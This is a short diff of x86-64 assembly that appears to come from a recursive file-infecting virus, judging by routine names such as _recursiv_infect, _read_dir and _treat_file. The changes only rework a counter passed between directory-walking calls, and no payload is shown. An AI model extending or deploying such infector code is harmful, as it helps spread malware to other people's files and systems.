@@ -56,7 +56,6 @@ _read_dir:
 
 	;; Save up arguments
 	mov		QWORD [rsp + 376], rdx
-	add QWORD [rsp + 376], 0x00010000
 	mov		QWORD [rsp + 368], rax
 	mov		QWORD [rsp + 312], rdi
 	mov		QWORD [rsp + 344], rsi
@@ -276,10 +275,12 @@ _treat_normally:
 	mov		r10, 1						; we set the recursif mode
 
 _call_treat_file:
+	mov r11, QWORD [r11 + 376]
 	call _treat_file
 	
 	;; Restore stack frame after function call
 	add rsp, QWORD [rsp]
+	add QWORD [rsp + 376], 0x00000001
 	
 	;; If we didn't forked, we just continue normally
 	cmp		rax, 0 
@@ -303,6 +304,8 @@ _recursiv_infect:
 	mov rdi, QWORD [rsp + 296]
 	add rdi, 19
 	mov rsi, rsp
+	add QWORD [rsp + 376], 0x00010000
+	mov rdx, QWORD [rsp + 376]
 	mov r10, QWORD [rsp + 336] 
 		sub rsi, r10
 		sub rsp, r10
